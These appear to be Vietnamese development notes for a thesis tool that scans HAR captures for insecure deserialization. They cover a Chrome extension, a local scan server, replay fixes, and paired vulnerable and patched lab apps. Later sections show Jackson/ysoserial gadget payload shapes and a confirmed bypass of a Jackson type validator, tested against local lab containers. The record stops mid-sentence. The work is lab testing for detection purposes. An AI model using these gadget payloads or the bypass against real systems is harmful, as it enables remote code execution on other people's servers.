# Ghi chú tiến độ — EthicalQuoc

**[LÀM XONG Phase 8 — Chrome extension + local server (`ethicalquoc serve`). Build + test plumbing OK, chưa load thử trên browser thật (browser đang ngắt kết nối).]**

**Server (`main.py serve`):**
- [Server/serve.py](Server/serve.py) — stdlib `http.server` (ThreadingHTTPServer), **ZERO dependency** (hợp
  graders Mac). Bind `127.0.0.1:8099`. `GET /health` → `{status:ok}`; `POST /scan` (nhận `{"har":{...},
  "replay":true}`) → chạy `run_pipeline()` = HarLoader.parse_data→VectorFiltering→cleanfilter→`_analyze_one`
  →(tùy chọn) ReplayRequest → trả JSON findings (type/subtype/probe/severity/likely_vulnerable/indicators).
  CORS chỉ cho origin `chrome-extension://`. Tái dùng `_analyze_one` + `ReplayRequest` của main.py, KHÔNG
  đụng core.
- [har_loader.py](Scanner/har_loader.py): refactor nhẹ — tách `parse_data(har_dict)` ra khỏi `parse()` (đọc
  file) để server feed HAR in-memory không cần ghi file tạm.
- [main.py](main.py): thêm subcommand `serve` (--host/--port).

**Extension ([Extension/](../Web%20vul%20env/../../Thesis/Thesis/Extension)):** MV3.
- **Quyết định kỹ thuật quan trọng**: `chrome.devtools.network.getHAR()` CHỈ chạy trong DevTools panel (vẫn
  phải mở DevTools) → KHÔNG đạt mục tiêu "không cần mở DevTools". Nên dùng **`chrome.debugger` API** từ
  background service worker: attach CDP vào tab, `Network.enable`, buffer `requestWillBeSent`/
  `responseReceived`, tự dựng HAR khi bấm Complete. Capture được mà KHÔNG cần mở DevTools (chỉ hiện banner
  "đang debug").
- `background.js`: capture + buildHar (parse Cookie header → `cookies[]`, parse URL → `queryString[]`,
  lấy `postData.text` — đúng shape HarLoader cần; lọc bỏ ext tĩnh css/js/img).
- `popup.html`/`popup.js`: health check (ping `/health`, disable Complete khi server offline + nhắc chạy
  `python main.py serve`), Start/Complete/Cancel, hiện findings (badge LIKELY VULN / suspected), **click
  finding để mở chi tiết** (payload + baseline→mutated + indicators), nút **"Download JSON"** + **"View
  full report"**.
- `results.html`/`results.js`: **trang report ĐẦY ĐỦ** (mở tab riêng) — mỗi finding kèm payload đã gửi,
  baseline↔mutated response, mọi indicator, notes; nút Download JSON / Download HTML / Print→PDF. Dữ liệu
  truyền qua `chrome.storage.local`.
- Server `/scan` enrich: mỗi finding thêm `attempts[]` (payload_raw + baseline/mutated status+body_sample
  (cắt 800) + indicators mỗi lần replay) + `notes`/`confidence`/`normalized`. Verify WSL+app live: finding
  Jackson có 6 attempts đầy đủ payload+baseline200→mutated400+body+indicators, likely_vulnerable=True. ✓
- `manifest.json`: permissions `debugger`/`tabs`/`storage`, host `<all_urls>`.
- [Extension/README.md](Extension/README.md): hướng dẫn load unpacked + dùng.

**Verify:**
- `run_pipeline()` trên localhost.har thật: 168 vector → 21 findings, detect đúng (Jackson/Java/PHP). ✓
- HTTP layer: `/health` ok, `/scan` trả findings, CORS echo đúng `chrome-extension://` origin. ✓
- **Mô phỏng HAR đúng shape background.js sinh ra** (cookies parse từ header + postData.text) → feed server
  → detect đúng `raw_body/payload Java/Jackson Polymorphic Typing`. ✓ (chứng minh HAR extension khớp
  HarLoader mà không cần browser thật.)
- Suite: **116/116 pass** (refactor HarLoader không phá gì).

**CÒN LẠI (cần browser để test thật)**: load extension vào `chrome://extensions` (Developer mode → Load
unpacked → chọn `Extension/`), chạy `python main.py serve`, bấm Start → duyệt → Complete → xem popup. Đây
là bước user tự làm trên browser (browser đang ngắt khi build). Lưu ý: assess cần java/.NET runtime trên máy
chạy `serve` (như CLI) — detection thì không cần.

---

**[Ý TƯỞNG/THIẾT KẾ GỐC — Phase 8: Chrome extension + local server (ĐÃ IMPLEMENT — xem entry "[LÀM XONG Phase 8]" ở trên; giữ đoạn này làm hồ sơ thiết kế).]**

**Mục tiêu**: user duyệt web + bấm "Complete" trên extension → tự lấy HAR → tự chạy tool → hiện kết quả.
Không phải mở DevTools export HAR thủ công như hiện tại.

**Giới hạn then chốt (đã phân tích)**: Chrome extension KHÔNG chạy được chương trình local (sandbox) →
KHÔNG tự `python` được. Phải có cầu nối. Đã so 3 cách → **CHỐT: local server** (user chạy `ethicalquoc
serve` trước, giống bật Burp trước khi proxy — quen với pentester). Loại Native Messaging (phải đăng ký
native host manifest mỗi OS, phức tạp). Loại "chỉ tải HAR" (không tự động như mong muốn).

**Kiến trúc chốt:**
```
[Extension] bấm Complete -> getHAR() -> POST http://127.0.0.1:8099/scan (kèm HAR)
      -> [ethicalquoc serve = FastAPI bọc pipeline san co] HarLoader->analyze->assess->report
      -> tra JSON -> [Extension popup] hien bang likely_vulnerable / nut tai report
```

**Phần A — Capture HAR + tải (DỄ, làm được 100%):**
- DevTools-panel extension gọi `chrome.devtools.network.getHAR()` → HAR chuẩn (cách sạch nhất), HOẶC
  background + `chrome.debugger` attach Network domain tự dựng HAR (mạnh hơn, chạy nền, nhưng Chrome hiện
  banner "đang debug"). Có thể lọc sẵn chỉ request trong scope → HAR gọn.
- `chrome.downloads.download()` nếu muốn lưu file; hoặc gửi thẳng HAR qua POST không cần lưu.
- MV3 (bắt buộc hiện nay): `chrome.debugger`/devtools API/`chrome.downloads`/native messaging đều còn dùng
  được; chỉ `webRequest` kiểu CHẶN bị siết — nhưng ta chỉ QUAN SÁT nên không ảnh hưởng. (Nên verify lại API
  MV3 bằng search trước khi code cho chắc.)

**Phần B — Tool cần thêm (NHẸ, không đụng core):**
- `ethicalquoc serve` = bọc FastAPI quanh pipeline đã có (`_analyze_one` + replay):
  - `GET /health` → `{"status":"ok"}` (cho extension ping).
  - `POST /scan` (nhận HAR) → chạy HarLoader→analyze→assess→report → trả JSON.
- **CHỈ bind `127.0.0.1`** (không ra mạng — an toàn vì HAR chứa cookie/token thật của session).
- CORS: cho phép origin `chrome-extension://<id>`.

**UX giảm ma sát "phải chạy server trước":**
1. Extension ping `/health` khi mở popup; chưa chạy → nhắc *"Hãy chạy `ethicalquoc serve` trước"* + nút
   copy lệnh.
2. Nút "Complete" disable tới khi thấy server sẵn sàng.
3. Server in khi khởi động: `[+] EthicalQuoc server ready at http://127.0.0.1:8099 — extension can connect`.

**Effort ~2.5-3 ngày**: extension capture+download ~1-1.5; `serve` endpoint ~0.5; nối + popup kết quả ~1.
**Thứ tự ưu tiên**: LÀM SAU core thesis (các cặp vuln/secure + precision/recall). Đây là đóng góp UX/triển
khai (biến CLI → 1-click), feature riêng — Phase 8.

---

**[KẾ HOẠCH + RESEARCH — mở rộng test-env đa ngôn ngữ (vuln/secure pair) + đo precision/recall. Research thư viện phổ biến nhất hiện nay (WebSearch 2025-2026), chưa code, mới là scope.]**

**Phương pháp luận (chuẩn ngành, khi KHÔNG có dataset có nhãn)**: dựng cặp **vuln + secure giống hệt nhau
trừ phần vá** cho mỗi case/ngôn ngữ (= labeled testbed / negative-control, như đã làm với Java:
VULN=39 / SECURE=0). Đo bằng confusion matrix: TP/FP/FN/TN → Precision=TP/(TP+FP), Recall=TP/(TP+FN), F1.
Bổ sung benchmark công khai (OWASP Benchmark, Juice Shop, Vulhub) cho uy tín. KHÔNG dùng ML (tool là
rule-based, không có weight để học; ML cần dataset có nhãn — chính cái đang thiếu).

**Hiện trạng lab** (verify từ `Web vul env/`): Java vuln+secure XONG. PHP chỉ có vuln (SessionHelper
`unserialize` + monolog + User privesc), THIẾU secure. Node/Python/Ruby/.NET: tool hỗ trợ nhưng CHƯA có app.

**Mô hình "native + thư viện thêm" (câu hỏi gốc: ngôn ngữ nào cũng có kiểu OIS→Jackson không?)** — 3 nhóm:
- **Đơn nhất (PHP)**: chỉ `unserialize()`+phpggc thống trị; phar chỉ là cùng unserialize khác trigger →
  KHÔNG cần "Jackson-equivalent". 1 cặp đủ.
- **Đa thư viện (Java, Python, Ruby, .NET)**: có native + nhiều lib format khác → mỗi format 1 sub-case.
- **Thuần thư viện (Node.js)**: JS không có deser-to-object native (JSON.parse an toàn); mọi lỗ hổng từ lib.

**THƯ VIỆN CHỌN cho test-case (theo research mức độ liên quan 2025-2026):**
- **Python**: pickle (#1) + PyYAML (`yaml.load`). jsonpickle = "Jackson của Python" (JSON + dựng object),
  optional. ⭐ Xu hướng nóng: pickle trong ML model loading — CVE-2025-32434 (PyTorch), CVE-2025-32444
  (vLLM, CVSS 10) → dùng làm điểm "thời sự".
- **Ruby**: Marshal (#1, rất thời sự: CVE-2026-41316 ERB bypass 04/2026, gadget Ruby 4.0 về tới 3.3) +
  Psych/YAML (phụ — LƯU Ý Psych 4 / Ruby 3.1+ đã safe mặc định, chỉ vuln khi app bypass). **Tool CHƯA hỗ
  trợ Psych → đây là gap "kiểu Jackson" nếu muốn làm đủ.**
- **Node.js**: node-serialize (canonical, CVE-2017-5941 CVSS 9.8, NHƯNG đã ngừng bảo trì — classic để
  test) + prototype pollution (lớp riêng, phổ biến). = đúng 2 probe tool đã có.
- **.NET**: Json.NET `TypeNameHandling!=None` (hiện đại, còn dùng rộng — SharePoint RCE 2025-26; "Jackson
  của .NET") + ViewState (classic). BinaryFormatter = legacy (deprecated .NET5, GỠ .NET9) → 1 case cho đủ,
  ghi rõ legacy.
- **PHP**: `unserialize()`+phpggc (monolog). 1 case.

**Framing lớn cho thesis**: xu hướng dịch từ **serializer nhị phân native cũ** (BinaryFormatter/pickle/
Marshal — đang bị deprecated/cảnh báo) sang **(1) lib JSON-có-type-info** (Jackson/Json.NET/jsonpickle),
**(2) YAML unsafe**, **(3) ML model loading (pickle)**, **(4) prototype pollution**. Đúng hành trình Java
OIS→Jackson của tool → luận điểm xuyên suốt: "tool phải theo kịp dịch chuyển native-binary → library/JSON".

**⚠️ Verify trước khi trích thesis**: "phổ biến nhất" ở đây là ĐỊNH TÍNH (canonical/được-trích-nhiều),
không phải số download/incident cứng — cần tra npm/PyPI stats + NVD count riêng nếu muốn số. Vài CVE-2026
(Docling, LightLLM, SharePoint 2026) nguồn tự nhận CHƯA verify → tra NVD gốc trước khi dùng.

**LỊCH DỰ KIẾN (~8-11 ngày công, khuôn mẫu đã có từ Java nên sau nhanh hơn):**
- Phase 0: harness Precision/Recall (`ground_truth.json` mỗi app + `evaluate.py` đếm TP/FP/FN → P/R/F1).
  0.5-1 ngày. NỀN TẢNG, làm trước.
- Phase 1: PHP secure (vuln có sẵn). 0.5 ngày.
- Phase 2: Node.js vuln+secure (node-serialize + proto pollution). 1-1.5 ngày.
- Phase 3: Python vuln+secure (pickle + PyYAML). 1-1.5 ngày.
- Phase 4: Ruby vuln+secure (Marshal [+Psych nếu bổ sung tool]). 1-1.5 ngày.
- Phase 5: .NET vuln+secure (Json.NET + ViewState). 1.5-2 ngày. RỦI RO NHẤT (runtime, Windows/WSL2, graders
  dùng Mac → Docker phải chạy được).
- Phase 6: benchmark công khai. 1-2 ngày.
- Phase 7: tổng hợp metrics + viết chương đánh giá. 1 ngày.
Gợi ý: Tuần 1 (18-24/10) P0+P1; Tuần 2 (25-31/10) P2+P3; Tuần 3 (01-07/11) P4+P5; Tuần 4 (08-14/11) P6+P7.
Rủi ro lịch: mỗi ngôn ngữ cần user tự capture HAR bằng browser (bước handoff); cặp vuln/secure phải giống
hệt trừ phần vá; Phase 0 bắt buộc làm trước.

---

**[NEGATIVE-CONTROL TEST + 2 CẢI TIẾN replay oracle] Dựng app vá (java-app-secure) để kiểm tra tool có phân biệt vuln vs đã-vá không — phát hiện giới hạn, sửa, verify.**

**1. Thêm case Jackson kiểu KHÁC vào java-app (vuln)**: endpoint `POST /api/theme/import`
([ThemeImportController.java](../Web%20vul%20env/java-app/src/main/java/com/webvulenv/javaapp/controller/ThemeImportController.java))
dùng `@class` PROPERTY form + `@JsonTypeInfo(use=Id.CLASS)` KHÔNG validator (polymorphic typing không giới
hạn) — khác hẳn webhook (WRAPPER_ARRAY + allowlist PTV + bypass generic CVE-2026-54512). UI: card "Theme
appearance" trong dashboard.html. Tool detect đúng qua pattern `@class` (verify live: benign→200, gadget
`@class`→InvalidDefinition do blacklist nội bộ).

**2. Dựng java-app-secure (port 8083)** = bản copy java-app, vá đúng chuẩn (user chọn: trả lỗi generic,
KHÔNG lộ exception):
- OIS (SessionCookieFilter + MessageIntegrationController): look-ahead allow-list qua `resolveClass()` —
  gadget bị từ chối TRƯỚC khi chain chạy; mọi lỗi → 401 "Not authenticated" / 400 "Unsupported message
  format" (generic, không stacktrace).
- Jackson (webhook + theme): bỏ polymorphic, bind `channel`→`List<Object>`, `background`→`Map` — payload
  gadget thành TRƠ; lỗi → 400 "Invalid ..." sạch.

**3. Kết quả thí nghiệm (chạy tool thật trên HAR capture từ cả 2 app)** — phát hiện 1 giới hạn + 1
false-positive THẬT:
- webhook secure → gadget trơ 200→200 → tool KHÔNG flag (phân biệt sạch, lv=0 vs vuln lv=12). ✓
- NHƯNG theme secure (400 "Invalid theme") + OIS secure (401) → tool VẪN flag lv>0, chỉ vì **status đổi**
  (`_compare` coi MỌI status-change là tín hiệu mạnh). Boolean không phân biệt được "app từ chối an toàn
  (4xx sạch)" với "app bị khai thác (500 + exception)". Chỉ indicator error-disclosure phân biệt (vuln lộ
  exception, secure lộ 0).
- **FALSE-POSITIVE thật**: `/favicon.ico` 404→404 bị flag lv=True — vì heuristic content-diff bị đánh lừa
  bởi trường `timestamp` động trong trang lỗi Spring (`.094` vs `.100`), không liên quan payload.

**4. HAI CẢI TIẾN đã làm trong [replay_request.py](Replay/replay_request.py) `_compare()`:**
- **Xếp hạng tín hiệu**: `clean_rejection = (400<=status<500) and not error_hits`. Khi là clean 4xx (từ
  chối sạch, KHÔNG lộ exception) → status/length-change CHỈ ghi làm indicator, KHÔNG set strong_signal.
  5xx hoặc bất kỳ response nào lộ exception thì KHÔNG bao giờ "clean" → vẫn strong. (webhook vuln trả 400
  nhưng lộ `InvalidTypeIdException` → chứa "exception" → không clean → vẫn strong ✓).
- **Chuẩn hóa volatile trước content-diff**: `_strip_volatile()` thay ISO-8601 timestamp + epoch-millis
  bằng placeholder; content-diff chỉ tính khi bản đã chuẩn hóa KHÁC nhau → diệt FP favicon.

**5. Verify (re-score chính dữ liệu đã capture với `_compare` mới — cải tiến thuần post-capture nên
không cần bắn mạng lại):**

| Endpoint | VULN lv (cũ→mới) | SECURE lv (cũ→mới) |
|---|---|---|
| session dashboard/profile | 6→6, 1→1 (giữ: 500+exception) | 12→**0**, 2→**0** (401 sạch) |
| integration | 6→6 | 12→**0** (400 sạch) |
| theme jackson | 6→6 (400+InvalidDefinition) | 6→**0** (400 "Invalid theme" sạch) |
| webhook jackson | 12→12 | 0→0 |
| favicon | — | 6→**0**, 1→**0** (timestamp FP diệt) |

→ **VULN giữ nguyên 100% (0 mất detection), SECURE tất cả về 0, FP favicon biến mất.** Tool giờ phân biệt
vuln/đã-vá sạch ngay ở boolean `likely_vulnerable`. Test: thêm 4 test (`test_clean_4xx_rejection_*`,
`test_4xx_that_leaks_exception_is_still_strong`, `test_timestamp_only_diff_is_not_flagged`). Suite:
**116/116 pass**.

**6. XÁC NHẬN CUỐI trên file chạy lại THẬT (user tự re-run tool sau khi sửa, không phải re-score offline):**
`debug_step8.json` (vuln 8081) + `debug_step8_sc.json` (secure 8083) chạy lại 15:26-15:27. Đếm
`likely_vulnerable` trong output thật:
- **VULN flagged = 39** (session dashboard/profile 14, integration 7, theme 6, webhook 12 — tất cả là sink
  thật).
- **SECURE flagged = 0** (mọi endpoint, gồm favicon 404→404).
Khớp 100% với bảng re-score ở mục 5 → cải tiến đã ăn vào output thật của tool.

**FILE ĐÃ SỬA/THÊM trong 2 cải tiến (để tra nhanh sau này):**
- [replay_request.py](Replay/replay_request.py): `import re`; thêm `VOLATILE_PATTERNS` + `_strip_volatile()`;
  sửa `_compare()` (biến `clean_rejection`, downgrade status/length khi clean 4xx, thêm so sánh
  `_strip_volatile` ở nhánh content-diff).
- [test_replay_request.py](TestCase/test_replay_request.py): +4 test (2 case clean-4xx weak, 1 case
  4xx-lộ-exception vẫn strong, 1 case timestamp-only-diff không flag).
- Web vul env (target lab, KHÔNG phải code tool): java-app thêm `ThemeImportController`/`ThemeImportRequest`/
  `model/theme/ColorBackground` + UI card "Theme appearance"; dựng mới thư mục `java-app-secure/` (port 8083,
  vá OIS bằng look-ahead `resolveClass()` allow-list, vá Jackson bằng bind List/Map + lỗi generic).

**Giá trị thesis**: đây là negative-control hoàn chỉnh — chứng minh tool (a) không false-negative trên app
lỗ hổng (39 flag), (b) không false-positive trên app đã vá (0 flag), (c) phương pháp luận "dựng cặp
vuln/secure giống hệt để đo khả năng phân biệt" + đã lộ & sửa 2 giới hạn cụ thể của replay oracle.

---

**[DEEP TEST END-TO-END — localhost.har thật, đối chiếu phân tích thủ công từ source vs output tool. SAU fix provenance.]**

Chạy trọn `scan→analyze→assess→report` trong **WSL (có Java → ysoserial sinh payload thật)**, target là container `java-vuln-app`
thật đang chạy. 4 stage exit 0, 0 traceback. HAR chỉ có traffic Java app 8081 (15 entry, 8 endpoint).

Phân tích ground-truth ĐỘC LẬP từ source trước, rồi so:
- `session` cookie: [SessionCookieFilter.java:29](../Web%20vul%20env/java-app/src/main/java/com/webvulenv/javaapp/filter/SessionCookieFilter.java#L29)
  `ObjectInputStream.readObject()` CHỈ chạy khi URI = `/api/dashboard` hoặc `/api/profile`. commons-collections 3.2.1 (pom) +
  JDK 1.8.0_504 (container) → gadget CC có đường reflection. → **Tool (black-box, không đọc source) bắn gadget session vào CẢ 8
  endpoint, tự phát hiện ĐÚNG 2 endpoint dashboard+profile đổi 200→500**, các endpoint khác 200→200 likely=0. Khớp chính xác điều
  kiện filter mà không biết filter tồn tại. Body lỗi: `ClassCastException: java.util.HashMap cannot be cast to UserSession` =
  bằng chứng gadget được readObject() deserialize TRỌN VẸN (chain chạy xong) rồi mới fail ở cast → đúng sink nguy hiểm.
- raw_body `/api/integration/receive` (`MessageIntegrationController` readObject trực tiếp): likely=6+1, 200→500 InvalidClassException. ✓
- raw_body `/api/webhook/config` (Jackson CVE-2026-54512): likely=18, 200→400; plain gadget→`InvalidTypeId` (PTV app chặn),
  `ArrayList<gadget>`→`InvalidDefinition` (ĐÃ vượt PTV, blacklist nội bộ Jackson chặn), c3p0→`Cannot locate class`. ✓ (trước fix:
  cả 18 đều MismatchedInputException do body sai hình dạng — fix provenance đã sửa).
- `ref_tag` (decoy, chỉ urlDecode+echo): likely=0 mọi nơi, 200→200. ✓

Kết quả: **0 false negative** (cả 3 sink thật đều bị flag), decoy xử lý đúng, fix provenance chạy đúng trên cả 3 loại slot
(base64 cookie / url-encoded cookie / JSON lồng), **0 skip** trên HAR này (candidate top đều round-trip sạch). 1 điểm ghi nhận
(không phải bug): webhook plain-gadget 3/18 trả 400 "denied" = PTV app chặn AN TOÀN, nhưng tool vẫn likely_vulnerable=True theo
heuristic "status đổi + lộ exception" — nhất quán với triết lý luôn `Suspected`/không auto-`Confirmed`, để người review (400 kèm
stacktrace lộ tên thư viện + hành vi blacklist cũng đáng xem). Suite unit: 112/112 pass.

---

**[FIX KIẾN TRÚC — TỔNG QUÁT] Replay dựng lại request SAI khi candidate nằm lồng trong 1 giá trị lớn hơn — cả họ bug (Cookie header, form_body, JSON body lồng, base64url) sửa 1 lần bằng cơ chế "provenance": ghi lại MỌI bước biến đổi kèm cách đảo ngược, replay luôn THAY VÀO bản gốc thay vì dựng lại từ đầu.**

**Phát hiện**: user hỏi vì sao chạy tool không thấy Jackson gọi OOB. Đọc `debug_step8.json` thật: 18 payload `jackson_oob`
đều nhận `MismatchedInputException: Cannot deserialize ... WebhookConfigRequest from Array value` — tức request
gửi đi SAI HÌNH DẠNG, chưa từng chạm logic PTV/CVE. Nguyên nhân: [har_loader.py:74](Scanner/har_loader.py#L74)
capture cả body JSON thành 1 vector `raw_body/payload`; candidate thật là node `["channel"]` bên trong; nhưng replay
không biết đường đi đó nên `_send()` ghi đè **toàn bộ body** bằng mỗi gadget (mất key `label`, mất key `channel`).

**Gốc rễ chung (cùng họ với bug Cookie/header — plan cũ đã cảnh báo "body/form_body cũng ghi đè toàn bộ, chưa
thấy xảy ra thực tế")**: từ ô HTTP tới candidate, giá trị đi qua nhiều bước (cleanfilter: tách `'; '`, cắt prefix;
normalize: url/base64/hex/gzip/jwt/json) nhưng tool chỉ nhớ một phần, chỉ nhớ TÊN không nhớ NGỮ CẢNH. Gặp bước
không đảo ngược được → âm thầm gửi mảnh nhỏ vào chỗ cả cụm. Verify thật thêm 1 bug ngầm cùng họ: cookie base64url
`...fT8_Pw` bị rewrap thành `...fT8/Pw==` (sai alphabet + thêm padding).

**Fix (1 cơ chế chung, không vá từng case):**
- [Utility/transforms.py](Utility/transforms.py) (mới): mỗi bước là 1 `Step` dict có đủ ngữ cảnh để chạy xuôi và
  đảo ngược — `slice` (start/end), `url` (ký tự gốc để nguyên + hoa/thường hex), `base64`/`base64_gzip` (alphabet
  urlsafe? padding?), `hex` (hoa/thường), `jwt_segment` (index), `json` (đường dẫn key + kiểu separator), + `trim`
  khi decode có strip. `rebuild(slot, chain, new_leaf)`: đi xuôi để lấy mọi giá trị cha GỐC, rồi đi ngược thay giá trị
  mới vào từng cha gốc → anh em (cookie khác, key JSON khác, chữ ký JWT...) + format gốc được giữ tự động.
- **Lưới an toàn**: `mark_if_lossy()` kiểm tra ngay lúc ghi nhận: đảo ngược bước trên chính output của nó phải ra lại
  cha (giống từng byte, hoặc tương đương với url-hex-case/gzip/json-whitespace). Không được → đánh dấu `lossy`;
  op lạ hoặc bước lossy → `TransformError` → replay **SKIP kèm lý do rõ ràng** ("Cannot faithfully rebuild the request
  slot"), KHÔNG BAO GIỜ gửi request khác đi. Case mới trong tương lai sẽ "lỗi to", không "lỗi sai".
- [cleanfilter.py](Analyze/cleanfilter.py): tính offset chính xác → ghi bước `slice`; KHÔNG còn cắt `=` ở cuối (đó là
  padding base64, cắt đi làm giá trị replay khác giá trị đã capture).
- [normalize.py](Analyze/normalize.py): mỗi decode trả `Step`; JSON tách cả **node con** (object/array) với path, không
  chỉ chuỗi lá → wrapper Jackson tại `["channel"]` thành candidate riêng. `get_transform_chain()` mới.
- [main.py](main.py) `_analyze_one`: nối `clean_steps + normalize steps` = `transform_chain`, kèm `slot_value`; đi theo
  mutation ([payloadMutation.py](Analyze/payloadMutation.py) `_make_payload`).
- [replay_request.py](Replay/replay_request.py): dùng `rebuild()`; `_send()` cho query/form_body chỉ thay đúng 1 cặp
  `name=value` (`_replace_pair`), các cặp khác giữ nguyên byte; multipart → báo lỗi rõ ràng thay vì làm hỏng body.
  Mutation cũ không có `transform_chain` vẫn chạy đường legacy.

**Verify:**
- Bất biến round-trip trên **4 file HAR** (localhost.har thật, integration_real, php-app-session, comprehensive):
  194 candidate → **0 failure** (186 giống từng byte, 1 tương đương, 7 lossy bị từ chối đúng thiết kế).
- Test mới [test_transforms.py](TestCase/test_transforms.py) (16 test: round-trip từng op, base64url giữ alphabet,
  Jackson lồng giữ `label`, Cookie header chỉ thay đúng segment, lossy bị từ chối, form_body giữ param khác, bất biến
  trên comprehensive.har). Suite: **112/112 pass**.
- **Live**: chạy lại `debug_pipeline.py --har localhost.har --step 8` vào `java-vuln-app` thật. Body gửi đi giờ là
  `{"label":"email alerts","channel":[<gadget>]}`. Server trả: 3 gadget thường → `InvalidTypeIdException` (PTV app
  chặn); `ArrayList<JdbcRowSetImpl>`/`ArrayList<PropertyPathFactoryBean>` → `InvalidDefinitionException` (ĐÃ VƯỢT PTV
  app, bị blacklist nội bộ Jackson chặn); `ArrayList<c3p0...>` → `Cannot locate class` (đã vượt PTV, c3p0 không có trên
  classpath). Khớp 100% kết quả test tay bằng curl. Trước fix: cả 18 đều `MismatchedInputException`.

**Còn tồn đọng (không sửa trong lần này, chỉ ghi nhận)**: trong comprehensive.har có 2 vector mà candidate đứng đầu đến
từ bước base64 lossy (base64 trên text không phải base64 → ra rác): `raw_body` JSON `$type`, và header
`Content-Disposition: form-data; ...; filename="Tzo0..."` (cleanfilter chỉ cắt prefix `key=` cho Cookie/Authorization,
nên `filename="` còn dính vào). Trước fix tool gửi rác thay cả body/header; giờ replay skip có lý do. Cải thiện thật cần
sửa ranking/cleanfilter (ưu tiên candidate không lossy, cắt `key="..."` cho mọi header dạng `; `) — đụng phần DETECTION,
để quyết định riêng.

---

**[THỰC HIỆN XONG PLAN CVE-2026-54512] Đọc sâu patch commit, thêm endpoint Jackson thật vào `java-app`, thêm payload generic-bypass, verify LIVE trên container thật (không phải suy đoán).**

**1. Đọc sâu patch thật** (`mbechler`... à không, `FasterXML/jackson-databind` commit `434d6c511`, issue #5988) qua
`.patch` diff trực tiếp từ GitHub — xác nhận chính xác: fix thêm `_validateTypeParameter()` đệ quy trong
`DatabindContext._resolveAndValidateGeneric()`, validate từng `containedType(i)` + `getContentType()` (array)
qua CHÍNH PTV đã cấu hình, trừ `Object.class`. Đọc luôn file test thật
`BasicPTVGenericParameterBypassTest.java` đính kèm trong patch — xác nhận PoC dùng
`.polymorphicTypeValidator(ptv)` (KHÔNG dùng `.activateDefaultTyping()`) + field
`@JsonTypeInfo(use = Id.CLASS, include = As.WRAPPER_ARRAY)` riêng lẻ trên 1 field `Object` — tức đây là
**cấu hình "an toàn theo khuyến nghị" (có PTV allow-list cụ thể) vẫn bị bypass**, không phải code cẩu thả
bật default typing toàn cục — thực tế và thuyết phục hơn hẳn cho thesis.

**2. Thêm endpoint thật vào `java-app`** (file mới, không sửa code cũ):
- [`model/webhook/NotificationChannel.java`](../Web%20vul%20env/java-app/src/main/java/com/webvulenv/javaapp/model/webhook/NotificationChannel.java) — abstract base, [`EmailChannel.java`](../Web%20vul%20env/java-app/src/main/java/com/webvulenv/javaapp/model/webhook/EmailChannel.java) — case lành.
- [`model/WebhookConfigRequest.java`](../Web%20vul%20env/java-app/src/main/java/com/webvulenv/javaapp/model/WebhookConfigRequest.java) — `public Object channel` với đúng annotation PoC.
- [`controller/WebhookConfigController.java`](../Web%20vul%20env/java-app/src/main/java/com/webvulenv/javaapp/controller/WebhookConfigController.java) — `POST /api/webhook/config`, `ObjectMapper` riêng (không đụng mapper toàn cục Spring Boot) với PTV allow `java.util.ArrayList`/`HashMap`/`com.webvulenv.javaapp.model.webhook.` — y hệt `mapperWithArrayListAndSafePayload()` trong test thật.
- UI trigger thật: card "Notification channel" trong `dashboard.html` (textarea + nút "Save channel config"), theo đúng rule [feedback-new-api-must-be-used-in-web].
- **Build Docker thật: `BUILD SUCCESS`**, 13 source file compile sạch (không có lỗi cú pháp/import).

**3. Thêm payload generic-bypass vào `payloadMutation.py`**: `JACKSON_OOB_GADGETS_GENERIC_BYPASS` — bọc
3 gadget cũ (`JdbcRowSetImpl`/`PropertyPathFactoryBean`/`JndiRefForwardingDataSource`) thành dạng
`["java.util.ArrayList<pkg.Class>",[{...}]]` (thân gadget giữ nguyên, chỉ bọc trong mảng 1 phần tử —
đúng cấu trúc test thật). `_mutate_jackson_oob()` giờ sinh **6** payload (3 cũ + 3 generic-bypass).
Round-trip verify: cả 6 payload tự sinh được `Fingerprint` của chính tool nhận lại đúng
`"Jackson Polymorphic Typing"`. Test mới `test_mutate_generates_generic_bypass_variant_alongside_plain_gadgets`.
Suite: **96/96 pass**.

**4. VERIFY LIVE trên container thật (`docker build` + `docker run`, port 18081, đã xoá sau khi xong)** —
đây là phát hiện quan trọng nhất, KHÔNG nằm trong plan ban đầu:

| Payload gửi tới `/api/webhook/config` | Kết quả thật |
|---|---|
| `["com.webvulenv.javaapp.model.webhook.EmailChannel",{"address":"..."}]` (case lành) | `{"success":true,...}` ✓ |
| `["com.sun.rowset.JdbcRowSetImpl",{...}]` (gadget thường, không allow-list) | `InvalidTypeIdException: ... denied resolution` (chặn bởi PTV app) |
| `["java.util.ArrayList<com.sun.rowset.JdbcRowSetImpl>",[{...}]]` (generic-bypass) | `InvalidDefinitionException: ... prevented for security reasons` — **LỖI KHÁC**, không phải do PTV app nữa |
| `["org.springframework...PropertyPathFactoryBean",{...}]` (gadget thường) | `InvalidTypeIdException: ... denied resolution` |
| `["java.util.ArrayList<org.springframework...PropertyPathFactoryBean>",[{...}]]` (generic-bypass) | `InvalidDefinitionException: ... prevented for security reasons` |
| `["java.util.Date",12345]` (class KHÔNG nằm trong allow-list app, KHÔNG phải gadget nguy hiểm) | `InvalidTypeIdException: ... denied resolution` (chặn bởi PTV app, như mong đợi) |
| `["java.util.ArrayList<java.util.Date>",[12345]]` (generic-bypass, cùng class) | **`{"success":true,"channelType":"java.util.ArrayList",...}`** — **BYPASS THÀNH CÔNG HOÀN TOÀN** |

**Phát hiện/diễn giải quan trọng**: CVE-2026-54512 bypass **có thật và xảy ra đúng như advisory mô tả** ở
tầng PTV tự cấu hình của app (chứng minh sạch bằng `java.util.Date` — không phải gadget nguy hiểm, không
allow-list, nhưng vẫn lọt qua và materialize thành công khi bọc generic). NHƯNG với 2 gadget JNDI quen
thuộc (`JdbcRowSetImpl`, `PropertyPathFactoryBean`), sau khi bypass PTV app xong, chúng **còn bị chặn bởi
1 tầng khác, độc lập**: `SubTypeValidator.DEFAULT_NO_DESER_CLASS_NAMES` — blacklist CỨNG, NỘI BỘ của chính
jackson-databind (đã đọc source ở mục nghiên cứu trước đó), áp dụng bất kể PTV app cấu hình allow gì.
Bằng chứng: loại lỗi đổi từ `InvalidTypeIdException` (PTV app từ chối) sang `InvalidDefinitionException`
(tầng blacklist nội bộ Jackson từ chối, SAU KHI PTV app đã chấp nhận) — 2 exception khác nhau = 2 tầng
chặn khác nhau, chứng minh được bypass CÓ xảy ra dù không tới được JNDI lookup cuối cùng trên version
jackson-databind 2.13.5 cụ thể này.

**Ý nghĩa cho thesis/report**: payload generic-bypass của tool (`JACKSON_OOB_GADGETS_GENERIC_BYPASS`) sẽ
